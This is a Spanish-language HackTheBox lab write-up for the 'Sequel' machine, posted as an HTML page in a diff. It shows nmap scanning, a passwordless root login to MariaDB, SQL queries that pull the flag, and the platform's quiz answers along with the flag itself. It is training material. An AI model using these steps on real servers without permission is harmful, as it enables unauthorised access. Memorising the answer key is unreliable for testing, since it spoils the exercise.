@@ -1,0 +1,150 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Sequel HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/sp/sequel.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Sequel HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Sequel de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Sequel de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Sequel HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Sequel HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Sequel de la plataforma de HackTheBox","headline":"Writeup Sequel HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Sequel HackTheBox</h1>
+          <p>Resolución de la máquina Sequel de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.129.140.3
+Nmap scan report for 10.129.140.3
+PORT     STATE SERVICE
+3306/tcp open  mysql</span>
+</code></pre></div></div>
+
+<div><p>Podemos probar una autenticación por defecto, conectarnos como root sin contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ mysql </span><span class="p">-h10.129.140.3 -uroot
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 45
+Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+</span><span class="kd">MariaDB [(none)]></span>
+</code></pre></div></div>
+
+<div><p>Nos ha conectado, ahora listamos las bases de datos y vemos htb asi que la usamos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">MariaDB [(none)]></span><span class="p"> show databases;
++--------------------+
+| Database           |
++--------------------+
+| htb                |
+| information_schema |
+| mysql              |
+| performance_schema |
++--------------------+
+4 rows in set (0.099 sec)
+
+</span><span class="kd">MariaDB [(none)]></span><span class="p"> use htb;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+</span><span class="kd">MariaDB [htb]></span>
+</code></pre></div></div>
+
+<div><p>Una vez conectados podemos listar las tablas donde vemos una llamada config y otra users</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">MariaDB [htb]></span><span class="p"> show tables;
++---------------+
+| Tables_in_htb |
++---------------+
+| config        |
+| users         |
++---------------+
+2 rows in set (0.099 sec)
+
+</span><span class="kd">MariaDB [htb]></span>
+</code></pre></div></div>
+
+<div><p>Listando los datos de la tabla config en la columna value podemos ver la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">MariaDB [htb]></span><span class="p"> select * from config;
++----+-----------------------+----------------------------------+
+| id | name                  | value                            |
++----+-----------------------+----------------------------------+
+|  1 | timeout               | 60s                              |
+|  2 | security              | default                          |
+|  3 | auto_logon            | false                            |
+|  4 | max_size              | 2M                               |
+|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
+|  6 | enable_uploads        | false                            |
+|  7 | authentication_method | radius                           |
++----+-----------------------+----------------------------------+
+7 rows in set (0.099 sec)
+
+</span><span class="kd">MariaDB [htb]></span>
+</code></pre></div></div>
+
+<div><p>Vamos con las preguntas que nos pide la web de htb para pwnear la máquina</p></div>
+<blockquote><li><strong>What does the acronym SQL stand for?</strong></li>
+<ul><p></p><li>Structured Query Language</li></ul></blockquote><br>
+
+<blockquote><li><strong>During our scan, which port running mysql do we find?</strong></li>
+<ul><p></p><li>3306</li></ul></blockquote><br>
+
+<blockquote><li><strong>What community-developed MySQL version is the target running?</strong></li>
+<ul><p></p><li>MariaDB</li></ul></blockquote><br>
+
+<blockquote><li><strong>What switch do we need to use in order to specify a login username for the MySQL service?</strong></li>
+<ul><p></p><li>-u</li></ul></blockquote><br>
+
+<blockquote><li><strong>Which username allows us to log into MariaDB without providing a password?</strong></li>
+<ul><p></p><li>root</li></ul></blockquote><br>
+
+<blockquote><li><strong>What symbol can we use to specify within the query that we want to display everything inside a table?</strong></li>
+<ul><p></p><li>*</li></ul></blockquote><br>
+
+<blockquote><li><strong>What symbol do we need to end each query with?</strong></li>
+<ul><p></p><li>;</li></ul></blockquote><br>
+
+<blockquote><li><strong>Submit root flag</strong></li>
+<ul><p></p><li>7b4bec00d1a39e3dd4e021ec3d915da8</li></ul></blockquote><br>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
